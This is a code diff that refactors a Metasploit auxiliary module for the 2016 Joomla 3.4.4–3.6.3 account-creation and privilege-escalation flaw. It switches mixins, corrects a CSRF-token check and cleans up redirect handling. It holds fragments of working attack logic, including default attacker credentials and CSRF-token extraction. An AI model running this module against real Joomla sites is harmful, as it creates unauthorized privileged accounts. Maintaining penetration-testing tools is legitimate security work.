@@ -3,13 +3,9 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-require 'nokogiri'
-
 class MetasploitModule < Msf::Auxiliary
 
-  include Msf::Auxiliary::Report
-  include Msf::Exploit::Remote::HttpClient
+  include Msf::Exploit::Remote::HTTP::Joomla
 
   def initialize(info = {})
     super(update_info(info,
@@ -32,7 +28,6 @@ class MetasploitModule < Msf::Auxiliary
           'Filipe Reis <fr[at]integrity.pt>',     # module creation and privilege escalation
           'Vitor Oliveira <vo[at]integrity.pt>',  # module creation and privilege escalation
         ],
-      'Targets'        => [['Joomla 3.4.4 - 3.6.3', {}]],
       'License'        => MSF_LICENSE,
       'DisclosureDate' => 'Oct 25 2016'
     ))
@@ -43,15 +38,16 @@ class MetasploitModule < Msf::Auxiliary
         OptString.new('USERNAME', [true, 'Username that will be created', 'expl0it3r']),
         OptString.new('PASSWORD', [true, 'Password for the username', 'expl0it3r']),
         OptString.new('EMAIL', [true, 'Email to receive the activation code for the account', 'example@youremail.com'])
-      ], self.class)
-      deregister_options('VHOST')
+      ]
+    )
+    deregister_options('VHOST')
   end
 
   def get_csrf(hidden_fields)
     hidden_list = hidden_fields
     hidden_list.each do |fields|
       fields.each do |item|
-        if item[0].length && item[1] == '1'
+        if item[0].length == 32 && item[1] == '1'
           return item[0]
         end
       end
@@ -95,20 +91,20 @@ class MetasploitModule < Msf::Auxiliary
       print_status("\tUsername: " + datastore['USERNAME'])
       print_status("\tPassword: " + datastore['PASSWORD'])
     elsif res && res.code == 303
-        while res && res.code == 303 do
-          res = send_request_cgi(
-            'uri' => res.redirection.to_s,
-            'method' => 'GET',
-            'cookie'  => cookie
-          )
-        end
+      while res && res.code == 303 do
+        res = send_request_cgi(
+          'uri' => res.redirection.to_s,
+          'method' => 'GET',
+          'cookie'  => cookie
+        )
+      end
 
-        print_error("There was an issue, but the user could have been created.")
+      print_error("There was an issue, but the user could have been created.")
 
-        parsed_data = Nokogiri::HTML.parse res.body
-        parsed_data.xpath('//div[@class="alert-message"]').each do |alert_msg|
-          print_error("\t" + alert_msg.text)
-        end
+      parsed_data = res.get_html_document
+      parsed_data.xpath('//div[@class="alert-message"]').each do |alert_msg|
+        print_error("\t" + alert_msg.text)
+      end
     else
       print_error("This host may not be vulnerable.")
     end
